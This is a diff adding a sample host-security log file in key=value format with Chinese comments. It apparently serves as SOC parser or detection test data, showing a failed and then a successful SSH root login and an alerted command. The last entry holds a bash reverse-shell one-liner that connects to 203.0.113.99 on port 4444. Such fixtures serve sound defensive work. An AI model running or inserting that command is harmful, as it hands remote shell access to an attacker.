@@ -1,0 +1,13 @@
+# 主机安全 raw_log 样例 (key=value 格式)
+# 来源: soc日志/event/esSearch_20260706144610.xlsx
+# 这是 SSH 登录失败事件 (暴力破解场景)
+
+src_ip=203.0.113.45&src_port=51234&dst_ip=10.10.1.100&dst_port=22&process=sshd&process_path=/usr/sbin/sshd&cmd=sshd: root@notty&user=root&event_type=SSH登录失败&status=failure&event_time=2026-07-05 15:30:22
+
+# 这是 SSH 登录成功事件
+
+src_ip=203.0.113.45&src_port=52301&dst_ip=10.10.1.100&dst_port=22&process=sshd&process_path=/usr/sbin/sshd&cmd=sshd: root@pts/0&user=root&event_type=SSH登录成功&status=success&event_time=2026-07-05 15:30:25
+
+# 这是异常命令执行 (反弹 shell 场景, cmd 含特殊字符)
+
+src_ip=10.10.1.100&src_port=40000&dst_ip=10.10.1.100&dst_port=0&process=bash&process_path=/bin/bash&cmd=bash -c "bash -i >& /dev/tcp/203.0.113.99/4444 0>&1"&user=www-data&event_type=异常命令执行&status=alert&event_time=2026-07-05 16:00:00
